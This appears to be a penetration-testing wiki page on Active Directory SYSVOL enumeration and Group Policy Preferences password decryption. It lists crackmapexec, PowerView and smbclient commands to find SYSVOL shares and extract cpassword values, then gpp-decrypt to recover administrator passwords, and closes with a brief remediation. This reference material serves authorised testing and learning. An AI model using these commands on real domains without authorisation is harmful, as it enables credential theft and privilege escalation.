---
layout: default
title: SYSVOL Enumeration
parent: Active Directory
nav_order: 18
permalink: /ad/sysvol/
---

# SYSVOL Enumeration
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Group Policies are XML files used by Active Directory for rights management. These files might contains the local built-in Administrator’s password, which is historically encrypted through Group Policy Preferences (GPP). However, even though GPP-stored passwords are encrypted with AES-256, the private key for the encryption has been posted on MSDN few years ago. Therefore, an attacker who has access to GPP-stored passwords could decrypt them and escalate his privileges.

See [AES-256 private key for passwords encryption in Group Policies](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN#endNote2).

## Prerequisites

- Read access to SYSVOL share on domain controller.

## Exploit

First, you must look for shares that might contain Group Policies. You can first focus on `SYSVOL` folders that are mapped to `%SystemRoot%\SYSVOL\Sysvol\domain-name` on domain controllers by default.

```bash
# With PowerView
Find-DomainShare

# Manually with CME
cme smb $DC_IP -d $DOMAIN -u '' -p '' --shares
cme smb $DC_IP -d $DOMAIN -u 'Guest' -p '' --shares
cme smb $DC_IP -d $DOMAIN -u $USERNAME -p $PASSWORD --shares

# Connect to SYSVOL share
smbclient \\\\$DC_IP\\SYSVOL -U $DOMAIN/$USERNAME

# Automatically with CME
cme smb $DC_IP -d $DOMAIN -y $USERNAME -p $PASSWORD -M gpp_autologin
cme smb $DC_IP -d $DOMAIN -y $USERNAME -p $PASSWORD -M gpp_password
```

Once you identified relevant shares, try to find Group Policies (XML files). You must identify the `name` and `cpassword` properties in these files.

```bash
# From a domain joined computer
ls \\$DC_IP\sysvol\$DOMAIN\

# With smbclient
smbclient -L \\\\$DC_IP\\sysvol\\$DOMAIN -U $USERNAME
```

You can now decrypt the `cpassword` using `gpp-decrypt` on Kali.

```bash
gpp-decrypt "+....."
```

## Recommendations

- [ ]  Don’t store Group Policies into unsecure shares.